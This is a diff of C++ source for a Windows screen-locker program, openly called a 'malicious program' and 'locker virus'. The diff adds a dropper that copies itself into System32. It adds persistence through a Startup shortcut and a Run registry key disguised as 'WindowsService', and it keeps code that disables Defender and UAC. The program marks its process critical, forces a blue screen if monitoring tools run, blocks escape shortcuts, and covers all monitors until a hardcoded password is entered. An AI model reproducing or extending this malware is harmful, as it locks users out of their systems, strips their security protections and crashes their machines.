@@ -12,12 +12,15 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "gdi32.lib")
 
+// Global handles
 HWND g_hLocker = 0;
 HHOOK g_hHook = 0;
 HANDLE g_hMonitorThread = 0;
 bool g_Unlocked = false;
 
+// Forward declarations
 LRESULT CALLBACK MainProc(HWND, UINT, WPARAM, LPARAM);
 LRESULT CALLBACK LockerProc(HWND, UINT, WPARAM, LPARAM);
 LRESULT CALLBACK KbHook(int, WPARAM, LPARAM);
@@ -29,13 +32,51 @@ void MakeProcessCritical(BOOL critical);
 void DoBSOD();
 DWORD WINAPI MonitorThread(LPVOID);
 void RequestAdmin();
+bool IsRunningAsLocker();
 
+// NT API definitions
 typedef LONG NTSTATUS;
-typedef NTSTATUS (__stdcall *pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
-typedef NTSTATUS (__stdcall *pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID, ULONG, PULONG);
+typedef NTSTATUS(__stdcall* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
+typedef NTSTATUS(__stdcall* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID, ULONG, PULONG);
 
-int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int nShow)
+// Decide behaviour: dropper or locker
+int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR pCmdLine, int nShow)
 {
+    if (IsRunningAsLocker()) {
+        // Act as the actual locker
+        SetupPersistence();
+        DisableDefenderAndUAC();
+        MakeProcessCritical(TRUE);
+        g_hMonitorThread = CreateThread(0, 0, MonitorThread, 0, 0, 0);
+        g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbHook, GetModuleHandle(0), 0);
+
+        int x = GetSystemMetrics(SM_XVIRTUALSCREEN), y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN), h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+        const wchar_t CLS[] = L"LockerWnd";
+        WNDCLASS wc = {};
+        wc.lpfnWndProc = LockerProc;
+        wc.hInstance = GetModuleHandle(0);
+        wc.lpszClassName = CLS;
+        wc.hCursor = LoadCursor(0, IDC_ARROW);
+        wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
+        RegisterClass(&wc);
+
+        g_hLocker = CreateWindowEx(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, CLS, L"",
+            WS_POPUP | WS_VISIBLE, x, y, w, h, 0, 0, GetModuleHandle(0), 0);
+        SetWindowPos(g_hLocker, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
+
+        MSG m;
+        while (GetMessage(&m, 0, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); }
+
+        // Cleanup after unlock
+        g_Unlocked = true;
+        TerminateThread(g_hMonitorThread, 0);
+        UnhookWindowsHookEx(g_hHook);
+        MakeProcessCritical(FALSE);
+        return 0;
+    }
+
+    // Dropper mode
     RequestAdmin();
     Warnings();
     const wchar_t CLS[] = L"MainWnd";
@@ -57,6 +98,23 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int nShow)
     MSG m;
     while (GetMessage(&m, 0, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); }
     return 0;
+}
+
+// Check if we are running as the dropped locker (by path or argument)
+bool IsRunningAsLocker()
+{
+    wchar_t myPath[MAX_PATH];
+    GetModuleFileName(0, myPath, MAX_PATH);
+    std::wstring pathStr = myPath;
+    // If the executable is in System32 and named loll.exe, run as locker
+    if (pathStr.find(L"\\system32\\loll.exe") != std::wstring::npos ||
+        pathStr.find(L"\\SysWOW64\\loll.exe") != std::wstring::npos)
+        return true;
+    // Check command line for "--locker" flag
+    std::wstring cmdLine = GetCommandLine();
+    if (cmdLine.find(L"--locker") != std::wstring::npos)
+        return true;
+    return false;
 }
 
 void RequestAdmin()
@@ -85,31 +143,32 @@ void RequestAdmin()
 
 void Warnings()
 {
-    MessageBox(0, L"WARNING 1/2: This program is a malicious demo. "
-        L"It will lock your screen, disable security features, and cause a BSOD if tampered with. "
-        L"Proceed only in an isolated lab environment.",
-        L"Malware Demo", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
-    MessageBox(0, L"WARNING 2/2: Full responsibility is yours. "
-        L"The locker covers all monitors and blocks most escape shortcuts. "
-        L"Closing it will crash the system.",
-        L"Malware Demo", MB_OK | MB_ICONSTOP | MB_SYSTEMMODAL);
+    MessageBox(0, L"WARN malicious programm. "
+        L"this is malicious program. "
+        L"Proceed only if you know what you doing.",
+        L"shittyVirus", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
+    MessageBox(0, L"WARN 2: "
+        L"this is simple locker virus with blocking shortcuts"
+        L"closing it with anything will cause bsod :0",
+        L"shittyVirus", MB_OK | MB_ICONSTOP | MB_SYSTEMMODAL);
 }
 
 LRESULT CALLBACK MainProc(HWND h, UINT m, WPARAM w, LPARAM l)
 {
     if (m == WM_COMMAND && LOWORD(w) == 101) {
         if (SendMessage(GetDlgItem(h, 100), BM_GETCHECK, 0, 0) == BST_CHECKED) {
-            if (IDYES == MessageBox(h, L"Final check: execute locker and arm protections?",
+            if (IDYES == MessageBox(h, L"Pre-Final warn: are you sure to execute malware?",
                 L"Last chance", MB_YESNO | MB_ICONEXCLAMATION | MB_DEFBUTTON2)) {
                 DestroyWindow(h);
                 StartLocker();
             }
-        } else MessageBox(h, L"Check 'Are you sure?' first.", L"Notice", MB_OK);
+        } else MessageBox(h, L"Check 'Really Sure?' first.", L"Notice", MB_OK);
     }
     if (m == WM_DESTROY) PostQuitMessage(0);
     return DefWindowProc(h, m, w, l);
 }
 
+// Keyboard hook – blocks dangerous shortcuts only (unlock now via GUI)
 LRESULT CALLBACK KbHook(int code, WPARAM w, LPARAM l)
 {
     if (code == HC_ACTION && (w == WM_KEYDOWN || w == WM_SYSKEYDOWN)) {
@@ -119,7 +178,6 @@ LRESULT CALLBACK KbHook(int code, WPARAM w, LPARAM l)
         bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
         bool win = (GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000);
 
-        // Block dangerous combinations
         if ((alt && p->vkCode == VK_F4) ||
             (alt && p->vkCode == VK_TAB) ||
             (alt && p->vkCode == VK_SPACE) ||
@@ -131,59 +189,160 @@ LRESULT CALLBACK KbHook(int code, WPARAM w, LPARAM l)
             (win && p->vkCode == VK_TAB) ||
             p->vkCode == VK_LWIN || p->vkCode == VK_RWIN)
             return 1;
-
-        // Unlock sequence: R E L E A S E
-        static const DWORD seq[] = { 'R','E','L','E','A','S','E' };
-        static int idx = 0;
-        if (p->vkCode == seq[idx]) {
-            if (++idx == 7) {
-                g_Unlocked = true;
-                if (g_hLocker) PostMessage(g_hLocker, WM_USER + 1, 0, 0);
-                idx = 0;
-            }
-        } else { idx = 0; if (p->vkCode == seq[0]) idx = 1; }
     }
     return CallNextHookEx(g_hHook, code, w, l);
 }
 
+// Locker window with password input
 LRESULT CALLBACK LockerProc(HWND h, UINT m, WPARAM w, LPARAM l)
 {
-    if (m == WM_PAINT) {
-        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps); RECT r; GetClientRect(h, &r);
-        HBRUSH b = CreateSolidBrush(RGB(0, 0, 0)); FillRect(dc, &r, b); DeleteObject(b);
-        SetBkMode(dc, TRANSPARENT); SetTextColor(dc, RGB(255, 0, 0));
-        HFONT f = CreateFont(48, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET,
+    static HWND hPassEdit, hEnterBtn;
+    static HFONT hFont;
+
+    switch (m)
+    {
+    case WM_CREATE:
+    {
+        // Create UI elements once
+        hFont = CreateFont(36, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET,
             OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
             DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
-        SelectObject(dc, f);
-        DrawText(dc, L"YOUR PC IS LOCKED\nType the hidden key to unlock.", -1, &r,
-            DT_CENTER | DT_VCENTER | DT_WORDBREAK);
-        DeleteObject(f); EndPaint(h, &ps); return 0;
+
+        hPassEdit = CreateWindow(L"EDIT", L"",
+            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_PASSWORD,
+            100, 300, 200, 40, h, 0, GetModuleHandle(0), 0);
+        SendMessage(hPassEdit, WM_SETFONT, (WPARAM)hFont, TRUE);
+
+        hEnterBtn = CreateWindow(L"BUTTON", L"Enter",
+            WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
+            120, 360, 150, 40, h, (HMENU)102, GetModuleHandle(0), 0);
+        SendMessage(hEnterBtn, WM_SETFONT, (WPARAM)hFont, TRUE);
+
+        SetFocus(hPassEdit);
+        break;
     }
-    if (m == WM_CLOSE || m == WM_SYSCOMMAND) return 0;
-    if (m == WM_USER + 1) { DestroyWindow(h); return 0; }
-    if (m == WM_DESTROY) PostQuitMessage(0);
+    case WM_PAINT:
+    {
+        PAINTSTRUCT ps;
+        HDC dc = BeginPaint(h, &ps);
+        RECT r;
+        GetClientRect(h, &r);
+
+        // Black background
+        HBRUSH black = CreateSolidBrush(RGB(0, 0, 0));
+        FillRect(dc, &r, black);
+        DeleteObject(black);
+
+        SetBkMode(dc, TRANSPARENT);
+        SetTextColor(dc, RGB(255, 0, 0));
+
+        // Main warning
+        HFONT bigFont = CreateFont(48, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET,
+            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
+            DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
+        SelectObject(dc, bigFont);
+        RECT topRect = r;
+        topRect.bottom = 250;
+        DrawText(dc, L"YOUR PC IS LOCKED", -1, &topRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+        DeleteObject(bigFont);
+
+        // Subtitle with author
+        SetTextColor(dc, RGB(200, 200, 200));
+        HFONT smallFont = CreateFont(24, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET,
+            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
+            DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
+        SelectObject(dc, smallFont);
+        RECT subRect = r;
+        subRect.top = 260;
+        subRect.bottom = 290;
+        DrawText(dc, L"made by mindyloozy   https://github.com/MindyLozy", -1, &subRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+        DeleteObject(smallFont);
+
+        EndPaint(h, &ps);
+        return 0;
+    }
+    case WM_COMMAND:
+        if (LOWORD(w) == 102 && HIWORD(w) == BN_CLICKED) {
+            // Enter button clicked
+            wchar_t buffer[128];
+            GetWindowText(hPassEdit, buffer, 128);
+            if (wcscmp(buffer, L"unlock123") == 0) { // Password: unlock123
+                DestroyWindow(h);
+            }
+            else {
+                MessageBox(h, L"Incorrect password.", L"Error", MB_OK | MB_ICONERROR);
+                SetWindowText(hPassEdit, L"");
+                SetFocus(hPassEdit);
+            }
+        }
+        break;
+    case WM_CLOSE:
+    case WM_SYSCOMMAND:
+        return 0;
+    case WM_DESTROY:
+        DeleteObject(hFont);
+        PostQuitMessage(0);
+        break;
+    }
     return DefWindowProc(h, m, w, l);
 }
 
-// Persistence: copies self to Startup folder and registry Run key
+// Drop the locker into System32 and execute it
+void StartLocker()
+{
+    // Copy self to C:\Windows\System32\loll.exe (requires admin)
+    wchar_t systemPath[MAX_PATH];
+    GetSystemDirectory(systemPath, MAX_PATH);
+    wcscat_s(systemPath, L"\\loll.exe");
+    wchar_t myPath[MAX_PATH];
+    GetModuleFileName(0, myPath, MAX_PATH);
+    CopyFile(myPath, systemPath, FALSE);
+
+    // Launch the dropped locker with --locker flag
+    std::wstring args = L"--locker";
+    SHELLEXECUTEINFO sei = { sizeof(sei) };
+    sei.lpVerb = L"open";
+    sei.lpFile = systemPath;
+    sei.lpParameters = args.c_str();
+    sei.nShow = SW_NORMAL;
+    ShellExecuteEx(&sei);
+
+    ExitProcess(0);
+}
+
+// Persistence: makes the locker start with Windows (for the dropped locker)
 void SetupPersistence()
 {
     wchar_t path[MAX_PATH];
     GetModuleFileName(0, path, MAX_PATH);
     wchar_t startup[MAX_PATH];
     if (SHGetFolderPath(0, CSIDL_STARTUP, 0, 0, startup) == S_OK) {
-        wcscat_s(startup, L"\\svchost.exe");
-        CopyFile(path, startup, FALSE);
+        wcscat_s(startup, L"\\loll.lnk"); // Use a shortcut to avoid UAC issues
+        // Create shortcut
+        IShellLink* psl;
+        IPersistFile* ppf;
+        CoInitialize(0);
+        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, 0, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&psl))) {
+            psl->SetPath(path);
+            psl->SetArguments(L"--locker");
+            if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
+                ppf->Save(startup, TRUE);
+                ppf->Release();
+            }
+            psl->Release();
+        }
+        CoUninitialize();
     }
+    // Registry Run (HKCU) as well
     HKEY hKey;
     if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueEx(hKey, L"WindowsService", 0, REG_SZ, (BYTE*)path, (DWORD)((wcslen(path) + 1) * sizeof(wchar_t)));
+        std::wstring cmdLine = std::wstring(path) + L" --locker";
+        RegSetValueEx(hKey, L"WindowsService", 0, REG_SZ, (BYTE*)cmdLine.c_str(), (DWORD)((cmdLine.length() + 1) * sizeof(wchar_t)));
         RegCloseKey(hKey);
     }
 }
 
-// Disables Windows Defender and UAC via registry (requires admin)
+// Disables Windows Defender and UAC (admin required)
 void DisableDefenderAndUAC()
 {
     HKEY hKey;
@@ -205,7 +364,6 @@ void DisableDefenderAndUAC()
     }
 }
 
-// Makes the current process critical — terminating it will cause a BSOD
 void MakeProcessCritical(BOOL critical)
 {
     HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
@@ -219,7 +377,6 @@ void MakeProcessCritical(BOOL critical)
     }
 }
 
-// Triggers a Blue Screen of Death
 void DoBSOD()
 {
     HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
@@ -242,7 +399,6 @@ void DoBSOD()
     TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, 4), 1);
 }
 
-// Monitors for blacklisted processes and triggers BSOD if found
 DWORD WINAPI MonitorThread(LPVOID)
 {
     const std::vector<std::wstring> blacklist = {
@@ -275,36 +431,4 @@ DWORD WINAPI MonitorThread(LPVOID)
         Sleep(500);
     }
     return 0;
-}
-
-// Main locker routine
-void StartLocker()
-{
-    SetupPersistence();
-    DisableDefenderAndUAC();
-    MakeProcessCritical(TRUE);
-    g_hMonitorThread = CreateThread(0, 0, MonitorThread, 0, 0, 0);
-    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbHook, GetModuleHandle(0), 0);
-
-    int x = GetSystemMetrics(SM_XVIRTUALSCREEN), y = GetSystemMetrics(SM_YVIRTUALSCREEN);
-    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN), h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-    const wchar_t CLS[] = L"LockerWnd";
-    WNDCLASS wc = {};
-    wc.lpfnWndProc = LockerProc;
-    wc.hInstance = GetModuleHandle(0);
-    wc.lpszClassName = CLS;
-    wc.hCursor = LoadCursor(0, IDC_ARROW);
-    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
-    RegisterClass(&wc);
-    g_hLocker = CreateWindowEx(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, CLS, L"",
-        WS_POPUP | WS_VISIBLE, x, y, w, h, 0, 0, GetModuleHandle(0), 0);
-    SetWindowPos(g_hLocker, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
-
-    MSG m;
-    while (GetMessage(&m, 0, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); }
-
-    g_Unlocked = true;
-    TerminateThread(g_hMonitorThread, 0);
-    UnhookWindowsHookEx(g_hHook);
-    MakeProcessCritical(FALSE);
 }
